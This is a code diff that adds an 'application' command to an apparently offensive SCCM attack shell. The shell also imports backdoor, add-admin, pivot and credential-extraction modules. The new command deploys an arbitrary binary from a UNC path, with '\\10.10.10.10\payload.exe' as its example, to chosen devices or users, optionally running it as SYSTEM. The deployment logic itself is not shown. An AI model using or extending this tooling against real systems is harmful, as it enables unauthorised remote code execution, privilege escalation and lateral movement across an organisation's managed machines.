@@ -2,6 +2,7 @@ import cmd2
 import pandas as dp
 import requests
 import traceback
+import argparse
 from requests_ntlm import HttpNtlmAuth
 from urllib3.exceptions import InsecureRequestWarning
 from tabulate import tabulate
@@ -11,6 +12,7 @@ from lib.scripts.runscript import SMSSCRIPTS
 from lib.scripts.backdoor import BACKDOOR
 from lib.scripts.pivot import CMPIVOT
 from lib.scripts.add_admin import ADD_ADMIN
+from lib.scripts.application import SMSAPPLICATION
 from lib.attacks.admin import DATABASE
 import os
 
@@ -23,6 +25,14 @@ class SHELL(cmd2.Cmd):
     IN = "Interface Commands"
     CE = "Credential Extraction Commands"
     hidden = ["alias", "help", "macro", "run_pyscript", "set", "shortcuts", "edit", "history", "quit", "run_script", "shell", "_relative_run_script", "eof"]
+    
+    
+    application_parser = argparse.ArgumentParser()
+    application_parser.add_argument('-t', '--target', action='store', help="ResourceID to target for application deployment")
+    application_parser.add_argument('-c', '--collection-type', action='store', help='Collection type to create for application deployment', choices=['user', 'device'])
+    application_parser.add_argument('-p', '--path', action="store", help='Command or UNC path of the binary/script to execute. Ex: \\\\10.10.10.10\\payload.exe')
+    application_parser.add_argument('-s', '--system', action="store_true", help='Run the application as NT AUTHORITY\\SYSTEM', default=False)
+    application_parser.add_argument('-n', '--name', action="store", help="Name of the application")
 
     def __init__(self, username, password, target, logs_dir, auser, apassword):
         #initialize plugins
@@ -31,6 +41,7 @@ class SHELL(cmd2.Cmd):
         self.backdoor = BACKDOOR(username=username, password=password, target = target, logs_dir = logs_dir, auser=auser, apassword=apassword)
         self.admin = ADD_ADMIN(username=username, password=password,target_ip=target, logs_dir=logs_dir)
         self.db = DATABASE(username=username, password=password,url=target, logs_dir=logs_dir)
+        self.application = SMSAPPLICATION(username=username, password=password,target=target, logs_dir=logs_dir)
         
         #initialize cmd
         super().__init__(allow_cli_args=False)
@@ -118,7 +129,23 @@ class SHELL(cmd2.Cmd):
         self.db.last_logon(arg)
 
 
+# ############
+# Application Section
+# ############
 
+
+
+
+    @cmd2.with_category(PE)
+    @cmd2.with_argparser(application_parser)
+    def do_application(self, args):
+        """Run application on target                     script (/path/to/script) """
+        self.application.run(path=args.path, runas_user=args.system, name=args.name, collection_type=args.collection_type, target_resource=args.target)
+
+    # @cmd2.with_argparser(movegroup_parser)   
+    # def do_movegroup(self, args):
+    #     """Move a group to a node"""
+    #     group_name, node_name = args.group, args.node
 
 # ############
 # PowerShell Script Section
